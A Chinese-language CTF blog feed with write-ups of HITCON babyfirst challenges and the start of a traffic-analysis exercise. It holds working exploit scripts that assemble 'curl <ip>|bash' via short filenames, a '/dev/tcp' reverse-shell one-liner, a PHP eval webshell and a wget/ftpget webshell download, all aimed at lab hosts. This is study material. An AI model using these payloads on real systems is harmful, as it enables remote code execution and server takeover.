&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></p><p>简单看一下这段代码比上一次的代码的cmd长度更小，很显然我们就不能再以<code>ls&gt;&gt;_</code> 来将相关的命令覆盖到文件里面了<br>但是orange大大用的方法真是叹为观止，根据官方payload一步步来分析这里是怎么巧妙的绕过4个字符串的长度的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">payload = [ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate "g&gt; ht- sl" to file "v"</span></span><br><span class="line"> <span class="string">'&gt;dir'</span>, </span><br><span class="line"><span class="string">'&gt;sl'</span>,</span><br><span class="line"> <span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line"> <span class="string">'&gt;ht-'</span>,</span><br><span class="line"> <span class="string">'*&gt;v'</span>,</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment"># reverse file "v" to file "x", content "ls -th &gt;g"</span></span><br><span class="line"> <span class="string">'&gt;rev'</span>,</span><br><span class="line"> <span class="string">'*v&gt;x'</span>, </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate "curl orange.tw|python;"</span></span><br><span class="line"> <span class="comment"># generate "curl 10.188.2.20|bash" </span></span><br><span class="line"><span class="string">'&gt;\;\\'</span>,</span><br><span class="line"> <span class="string">'&gt;sh\\'</span>, </span><br><span class="line"><span class="string">'&gt;ba\\'</span>,</span><br><span class="line"> <span class="string">'&gt;\|\\'</span>,</span><br><span class="line"> <span class="string">'&gt;20\\'</span>,</span><br><span class="line"> <span class="string">'&gt;2.\\'</span>,</span><br><span class="line"> <span class="string">'&gt;8.\\'</span>,</span><br><span class="line"> <span class="string">'&gt;18\\'</span>,</span><br><span class="line"> <span class="string">'&gt;0.\\'</span>,</span><br><span class="line"> <span class="string">'&gt;1\\'</span>,</span><br><span class="line"> <span class="string">'&gt;\ \\'</span>,</span><br><span class="line"> <span class="string">'&gt;rl\\'</span>,</span><br><span class="line"> <span class="string">'&gt;cu\\'</span>,</span><br><span class="line"></span><br><span class="line"> <span class="comment"># got shell</span></span><br><span class="line"> <span class="string">'sh x'</span>, </span><br><span class="line"><span class="string">'sh g'</span>,</span><br><span class="line"> ]</span><br></pre></td></tr></table></figure><p>首先第一个知识点就是Linux下存在<code>dir</code>命令作为<code>ls</code>命令的别名，可能有的系统没有，但是对于这道题而言是有的，而且他也是默认以字典序去排列，对于这题而言这个命令起到了拼接文件名的效果，但是注意含有特殊字符以及数字的情况下，字母排序的优先级会降低<br><img src="https://s1.ax1x.com/2018/09/18/ietTMt.png" alt="ietTMt.png"></p><p>第二个点在于单独一个<code>*</code>的命令有何作用，这个命令会先将当前目录下所有的文件进行一个排序，然后排序后的结果会以命令的形式送去<code>bash</code>执行，如下图，但是如果有写不是命令的话就会出现<code>command not found</code>的报错，这样一来我们就可一利用<code>dir</code>加上<code>*</code>命令去执行写入文件的操作，这也是这道题目关键之处，利用了逆序执行命令的骚操作，这得对Linux系统多么熟悉啊<br><img src="https://s1.ax1x.com/2018/09/18/iet7sP.png" alt="iet7sP.png"></p><p>接着上就提出下一个知识点，就是利用<code>rev</code>命令去反向文件的字符串，顾名思义，我们就是要把<code>ls -t &gt;g</code>这一条命令给逆序过来，这操作很强。这也是为什么要先构造下图中的文件名，你逆序过来就会发现是<code>ls -th &gt;g</code></p><p><img src="https://s1.ax1x.com/2018/09/18/ietHqf.png" alt="ietHqf.png"><br>有人可能会问为什么会多加一个<code>h</code>，因为如果不多加<code>h</code>的话在你执行<code>dir</code>的时候按字母排序字母<code>t</code>比<code>s</code>更靠后，放进<code>v</code>文件之后以及放入想文件里面是这样的，这就跟我们的目的相违背，不能构造出<code>ls -t &gt;g</code>了，但是我们构造的是<code>ls  -th &gt;g</code>情况就会有所改观，这个<code>h</code>实际上没有影响，就是一个改变视图结构的东西，把内存大小变得更加人性化而已。<br><img src="https://s1.ax1x.com/2018/09/18/ietqZ8.png" alt="ietqZ8.png"></p><p><img src="https://s1.ax1x.com/2018/09/18/ietLdS.png" alt="ietLdS.png"></p><p>按照上面所说把<code>v</code>文件的内容弄好，下面就应该创建一个<code>rev</code>的文件，为的是利用这个命令，通过<code>*v&gt;x</code>的方式把逆序后的内容放在x文件里面，到后期可以直接sh执行，<code>*v&gt;x</code>这个命令的含义就是将所有最后一个字母都是<code>v</code>的文件排个序，然后执行，因为r在v的前面实际上的命令就是 <code>rev v&gt;x</code>，所以最后到<code>x</code>文件里面的内容就是<br><img src="https://s1.ax1x.com/2018/09/18/ietjiQ.png" alt="ietjiQ.png"></p><p>到这里就跟第一个babyfirst-revenge一样了，后续步骤就不多说了,直接上EXP获取flag2333</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1.第一个利用的点是逆序字符串放入文件中在执行，如果让我来想我是绝对想不到的，学习了<br>2.第二个就是利用了<code>dir</code>命令完美滴绕过了<code>ls&gt;&gt;x</code>这个限制<br>3.Linux下<code>*</code>命令巧妙使用</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> 命令执行 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hitcon2015 babyfirst复现</title>
      <link href="/2018/09/14/hitcon2015-babyfirst/"/>
      <url>/2018/09/14/hitcon2015-babyfirst/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续上面的题目，直接利用上一道题目的docker环境复现一道题目<a id="more"></a>，注意这里面的docker环境可能需要自己在某些文件夹下面设置权限，自己缺点什么环境就自己下就行了，感觉这个题目的难度比较上一题低了一点，参考博客: <a href="https://blog.spoock.com/2017/09/09/Babyfirst-writeup/" target="_blank" rel="noopener">https://blog.spoock.com/2017/09/09/Babyfirst-writeup/</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先放个题目代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    $dir = <span class="string">'sandbox/'</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !file_exists($dir) )</span><br><span class="line">        mkdir($dir);</span><br><span class="line">    chdir($dir);</span><br><span class="line"></span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">for</span> ( $i=<span class="number">0</span>; $i&lt;count($args); $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span> ( !preg_match(<span class="string">'/^\w+$/'</span>, $args[$i]) )</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    exec(<span class="string">"/bin/orange "</span> . implode(<span class="string">" "</span>, $args));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这一段代码的意思就是建立一个<code>sandbox/clientip</code>文件夹 ，然后利用通过get法师获取args的参数，然后里面有一个正则匹配，只能通过的是数字以及字母不然的话就会直接die掉，最后就是利用exec这个执行函数了，而/bin/orange最终发现只是/bin/true的软链接，没有任何的作用。</p><p>这个题目关键是那个正则，那个正则在很多题目也有见到过，由于preg_match()使用的是\w来进行检查，所有的斜线、破折号和点<code>(\,-,.)</code>都无法使用。另外就是在<code>/^\w+$\</code>中的<code>$</code>当遇到一个字符串的结尾是换行符时还是可以匹配的。利用这个特性，就可以绕过前面的<code>preg_match()</code>检查，同时多出的换行符还可以在<code>exec()</code>函数中执行。</p><p>个人感觉这个题目如果<code>implode</code>里面的分割用的不是空格而是其他的类似逗号的东西这一个题目不一定可以写文件，或许其他大佬有办法可以跟我讲讲。留了空格刚好就可以写文件了</p><p>比如传参的url是这样的<code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=touch&amp;args[]=0ver</code><br>这三个参数都可以经过正则匹配<br>那么执行的过程就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/orange xxx</span><br><span class="line">touch test</span><br></pre></td></tr></table></figure><p>可以成功创建文件<br><img src="https://s1.ax1x.com/2018/09/14/iEgrQg.png" alt="iEgrQg.png"><br>这样一来，就先了正则，然后既可以创建文件了，如果implode里面不用空格分割的话，后面创建文件就会变成<code>touchtest</code>，这种东西是不可以创建文件的 </p><p>然后这里就是参考了大佬们的做法利用<code>wget</code>的方式去实现，tql</p><p>这里牵涉到另外一个知识点，我们平常见到的ip地址都是点分十进制表示的，其实IP地址还可以用直接10进制，八进制等等表示都可以</p><p>然后再开一个本地环境:192.168.1.106，服务器:192.168.1.102</p><p>在本地里面创建一个页面index.php内容为<code>&lt;?php phpinfo();?&gt;</code><br><a href="https://imgchr.com/i/iEgfYV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgfYV.md.png" alt="iEgfYV.md.png"></a></p><p>然后再往服务器发送相应的参数，这时候的ip地址转化就起作用了，把本地ip换一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">printf(<span class="string">"%u"</span>, ip2long(<span class="string">"192.168.1.106"</span>));</span><br></pre></td></tr></table></figure><p>得到输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3232235882</span><br></pre></td></tr></table></figure></p><p>这里用的这样的输出方法是为了解决32位以及64位php版本的问题，因为由于自己的php版本是32 位的输出的是负数，所以才用这样的的解决方法，参考链接<br><a href="https://blog.csdn.net/everything1209/article/details/22418559" target="_blank" rel="noopener">https://blog.csdn.net/everything1209/article/details/22418559</a></p><p>这时候就是开始利用了<br><code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=wget&amp;args[]=3232235882</code><br>然后就直接把192.168.1.106主页的页面给下载下来，但是这个页面是解析过了的，没有任何PHP语言的痕迹，只剩下html了<br><a href="https://imgchr.com/i/iEgIlF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgIlF.md.png" alt="iEgIlF.md.png"></a></p><p>这时候又是另外一个知识点了<br>在Linux中PHP能够执行非压缩的打包的PHP文件。<br>也就是这样的过程<br>创建1.php，内容为<code>&lt;?php echo &quot;123&quot;;?&gt;</code>，通过<code>tar</code>将<code>1.php</code>打包,<code>tar cvf test 1.php</code>，PHP运行test文件，可以运行<br><a href="https://imgchr.com/i/iEgHm9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgHm9.md.png" alt="iEgHm9.md.png"></a></p><p>复现到这里，发现orange大佬真是强，到后期就是利用上面两个知识点</p><p>在原来的本地的index.html里面改成这样的代码，注意一定要在<code>index.html</code>里面写上这样的语句，不然的话就会在像上面的例子一样在<code>index.php</code>里面的语句会被解析之后下载，会毫无用处下载下来是没有php语句的，更别谈解析了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">'cmd.php'</span>, <span class="string">'</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">header("Content-Type: text/plain");</span></span><br><span class="line"><span class="string"> @eval($_POST["cmd"]);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">'</span>);</span><br></pre></td></tr></table></figure><p>然后开始写webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102/?args[]=xxx%0a&amp;args[]=mkdir&amp;args[]=exploit 创建exploit文件夹</span><br><span class="line">http://192.168.1.102/?args[]=xxx%0a&amp;args[]=cd&amp;args[]=exploit%0a&amp;args[]=wget&amp;args[]=3232275969   进入exploit文件夹，下载192.168.158.1的index.html文件。</span><br></pre></td></tr></table></figure><p>然后就是利用打包的方式去执行相关的PHP代码了，想直接改名字是不可能的因为命令里面含有<code>&#39;.&#39;</code>这样的字符<br>再来一句<code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=php&amp;args[]=cmd</code> 执行一波这个打包未压缩的PHP文件</p><p>然后可以执行一句话木马了，打开小马页面<code>http://192.168.1.102/sandbox/192.168.1.102/cmd.php</code>，上菜刀链接成功<br><a href="https://imgchr.com/i/iE2S6e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iE2S6e.md.png" alt="iE2S6e.md.png"></a></p><p>再看一下服务器下面的目录成功创建了<code>cmd.php</code>页面<br><img src="https://s1.ax1x.com/2018/09/14/iE2Kmj.png" alt="iE2Kmj.png"></p><p>再看看出题人的官方wp发现还有其他骚操作<br>就是利用一波<code>ftp</code>方式去下载远程的一句话木马，因为自己虚拟机没有<code>busybox</code>这个东西就不搞了<br>但还是得过一遍脑紫的，利用下面的命令把远处<code>ftp</code>服务器里面的<code>webshell.php</code>给下载下来，这样做的好处就是不用再管原来那些php繁琐的解析步骤，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">busybox ftpget -u ftp的用户名 -p ftp的密码 ftp地址 需要下载的文件名</span><br></pre></td></tr></table></figure><p>很好的思路学习了，不一定就是busybox，还有其他利用ftp的下载功能来获取webshell的。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1.两个运用的知识点远程wget下载的PHP文件是经过解析的，服务器是可以通过用php执行打包的文件的，注意不是压缩的PHP文件，有点像是两个本来安全的东西放在一起后就变成了不安全的东西。。。。个人感觉问题的严重性还是出现在php能够执行未压缩的打包文件上。<br>2根据上一次的复现题目，个人感觉命令执行在这两道题目的上面都利用了远程的另外一台主机，第一次是使用了curl命令去访问，而这次是通过wget或者是ftp去访问，骚操作又学习了一波<br>3.正则可以换行符继续匹配那个点就不多说了</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> 命令执行 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hitcon2017 babyfirst-revenge复现</title>
      <link href="/2018/09/06/hitcon2017-babyfirst/"/>
      <url>/2018/09/06/hitcon2017-babyfirst/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>开学了还是得学习的，复现一波题目来玩玩，其实是实力不够不能去打网鼎杯<a id="more"></a>emmm</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先从Hitcon2017 babyfirst-revenge这一个题目，总结一下还是学到很多东西的<br>复现地址 <a href="https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge</a></p><p>这是题目回显的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这个源码的意思就是会自动创建一个<code>/www/sandbox/</code>然后在下面新建文件夹，然后可以通过<code>cmd</code>参数去执行相关系统命令，但是这个系统命令的长度是会有限制的，这题的关键在于要绕过这个长度以及如何去构造<code>getshell</code>的命令。<br>突然发现P神就是很早就有类似文章，我还是太菜，得拼命学习啊<br><a href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html" target="_blank" rel="noopener">https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html</a></p><h4 id="知识点一"><a href="#知识点一" class="headerlink" title="知识点一"></a>知识点一</h4><p>在Linux下面可以通过换行去执行断断续续的命令，例如<br><img src="https://s1.ax1x.com/2018/09/06/iCZyI1.png" alt="iCZyI1.png"></p><h4 id="知识点二"><a href="#知识点二" class="headerlink" title="知识点二"></a>知识点二</h4><p>在Linux下面可以通过写入一个文件，文件里面的内容是系统命令，然后可以通过<code>sh filename</code>来执行文本里面的系统命令，如果有报错的话会自动跳过<br>如<br><a href="https://imgchr.com/i/iCZgG6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCZgG6.md.png" alt="iCZgG6.md.png"></a></p><h4 id="知识点三"><a href="#知识点三" class="headerlink" title="知识点三"></a>知识点三</h4><p>我们可以通过&gt;+fileanme来实现新建一个文件，注意区别一下<code>&gt;</code>和<code>&gt;&gt;</code>这两个符号<br>小于号：命令默认从键盘获得的输入，改成从文件，或者其它打开文件以及设备输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; 是追加内容</span><br><span class="line">&gt; 是覆盖原有内容</span><br></pre></td></tr></table></figure><p>后面会有这里的详细利用</p><p>这样就可以运用这两个知识点去实现这段代码的绕过<br>思路就是通过构造一个文件然后往里面写入类似<code>curl 192.168.1.104|bash</code> 之类的语句然后执行，其实还可以利用其他python 以及PHP环境去执行代码，访问 <code>192.168.1.104/index.php</code>里面的内容<code>bash -i &gt;&amp; /dev/tcp/192.168.1.104/12345 0&gt;&amp;1</code>从而达到反弹webshell的目的</p><p>这里面注意两个点<br>第一点<code>ls</code>命令列文件的顺序，通过php执行的ls命令以及直接在linux下执行的ls命令是不一样的，因为我们一开始的输入是从php里面开始的<br>ls 的默认排序方式手册上只写了是<code>alphabetically</code>（字典序），经过测试发现ls排序方式是忽视字母大小写，数字排在字母前面，无视数字和英文字母之外的字符。<br>php执行生成的_的内容序列并非和我们在linux命令行一样，查资料 ls 排序和应该和环境变量<code>LC_COLLATE</code>有关！而php应该是c<br><a href="https://www.zhihu.com/question/273928679" target="_blank" rel="noopener">https://www.zhihu.com/question/273928679</a><br><img src="https://s1.ax1x.com/2018/09/06/iCetwd.png" alt="iCetwd.png"></p><p>所以还是按照官方wp那样通过追加方式去添加内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'&gt;ls\\'</span>, </span><br><span class="line"> <span class="string">'ls&gt;_'</span>, </span><br><span class="line"> <span class="string">'&gt;\ \\'</span>, </span><br><span class="line"> <span class="string">'&gt;-t\\'</span>, </span><br><span class="line"> <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line"> <span class="string">'ls&gt;&gt;_'</span>,</span><br></pre></td></tr></table></figure><p>就是为了拼凑出<code>ls -t&gt;g</code>，这是为了后面构造<code>curl 192.168.1.104|bash</code> 做好准备，我们就可以通过时间的先后顺序把curl命令完整的拼接</p><p>第二点我们是通过构造文件名，然后通过<code>ls</code>命令将文件名写入到另外一个文件里面去然后执行，这里面要注意转义符号<code>\</code>(反斜杠)不要忘记</p><p>然后我们在自己的vps上先写好反弹webshell的话<br><a href="https://imgchr.com/i/iCeaFI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCeaFI.md.png" alt="iCeaFI.md.png"></a></p><p>开始监听端口<br><img src="https://s1.ax1x.com/2018/09/06/iCeBSf.png" alt="iCeBSf.png"></p><p>上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">'&gt;ls\\'</span>, </span><br><span class="line">    <span class="string">'ls&gt;_'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;-t\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line">    <span class="string">'ls&gt;&gt;_'</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># generate `curl orange.tw.tw|python`</span></span><br><span class="line">    <span class="comment"># generate `curl 10.188.2.20|bash` </span></span><br><span class="line">    <span class="string">'&gt;sh\ '</span>, </span><br><span class="line">    <span class="string">'&gt;ba\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\|\\'</span>,</span><br><span class="line">    <span class="string">'&gt;6\\'</span>,  </span><br><span class="line">    <span class="string">'&gt;10\\'</span>,</span><br><span class="line">    <span class="string">'&gt;1.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;8.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;16\\'</span>, </span><br><span class="line">    <span class="string">'&gt;2.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;19\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;rl\\'</span>, </span><br><span class="line">    <span class="string">'&gt;cu\\'</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># exec</span></span><br><span class="line">    <span class="string">'sh _'</span>, </span><br><span class="line">    <span class="string">'sh g'</span>, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://192.168.1.104:49200//?reset=1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">5</span> </span><br><span class="line">    r = requests.get(<span class="string">'http://192.168.1.104:49200//?cmd='</span> + quote(i) )</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure><p>反弹webshell成功<br>然后在<code>/home</code>目录下发现有关flag的东西，应该是在数据库里面<br>连接一下<br><img src="https://s1.ax1x.com/2018/09/06/iCeDl8.png" alt="iCeDl8.png"><br>交互性极差，每次都要exit一下才有回显，也是服气。。。但最后还是得到flag了<br><a href="https://imgchr.com/i/iCer6S" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCer6S.md.png" alt="iCer6S.md.png"></a></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>其实这个题目还有其他骚操作，比如用利用<code>wget</code>，以及直接构造一个比较骚气的域名。。这域名搞不来，我就没有尝试了，至于wget方法的话下次复现一下2015年的babyfirst在尝试一下<br>小结一波，这个题目收获很大，先来讲这个东西其实是关乎对Linux系统各种缩小版米昂领的熟悉程度，比如怎样能快速新建文件这里就用了&gt;这个符号去创建，还有通过管道符去执行bash命令(这一点就可以继续去推行还可以使用python，php一系列的命令结合各种语言反弹webshell的操作)，这都是我想不到的东西，归根到底是学的东西还是不能够灵活使用<br>顺便吐槽一下，最近的算法课懵逼得很，全都跟高数的级数收敛还有泰勒展开扯上关系，突然恐惧，还得重新用C++写oj上的算法题目，都是些大佬。。我做完的时候他们都不知道ak多久了。。。<br><a href="https://imgchr.com/i/iCeb79" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCeb79.md.png" alt="iCeb79.md.png"></a></p><p>恐怕9月份难熬23333.。。。</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> 命令执行 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>铁三2018.5.5数据分析</title>
      <link href="/2018/09/06/liuliangfenxi-5-5/"/>
      <url>/2018/09/06/liuliangfenxi-5-5/</url>
      <content type="html"><![CDATA[<blockquote><p>keep learning</p></blockquote><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>链接: <a href="https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ</a> 密码: nux4<br>感谢方方土学长的<a href="http://skysec.top/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/" target="_blank" rel="noopener">题解</a>，学习到<a id="more"></a>了一定的套路</p><p>题目描述</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.黑客攻击的第一个受害主机的网卡IP地址</span><br><span class="line">2.黑客对URL的哪一个参数实施了SQL注入</span><br><span class="line">3.第一个受害主机网站数据库的表前缀(加上下划线 例如abc_)</span><br><span class="line">4.第一个受害主机网站数据库的名字</span><br><span class="line">5.Joomla后台管理员的密码是多少</span><br><span class="line">6.黑客第一次获得的php木马的密码是什么</span><br><span class="line">7.黑客第二次上传php木马是什么时间</span><br><span class="line">8.第二次上传的木马通过HTTP协议中的哪个头传递数据</span><br><span class="line">9.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)</span><br><span class="line">10.php代理第一次被使用时最先连接了哪个IP地址</span><br><span class="line">11.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候</span><br><span class="line">12.黑客在内网主机中添加的用户名和密码是多少</span><br><span class="line">13.黑客从内网服务器中下载下来的文件名</span><br></pre></td></tr></table></figure><p>先看看这些包都是按时间顺序命名的<br><img src="https://s1.ax1x.com/2018/09/06/iCAIZn.png" alt="iCAIZn.png"><br>先打开第一个包<br>一般黑客攻击先从应用层发起攻击，所以先过滤<code>http</code>看一下<br>发现ip为<code>202.1.1.2</code>对<code>192.168.1.8</code>有很明显的爆破痕迹，把里面的url的内容urldecode一下会发现明显的sql查询语句，而且有很明显sqlmap指纹痕迹<br><img src="https://s1.ax1x.com/2018/09/06/iCAbGT.png" 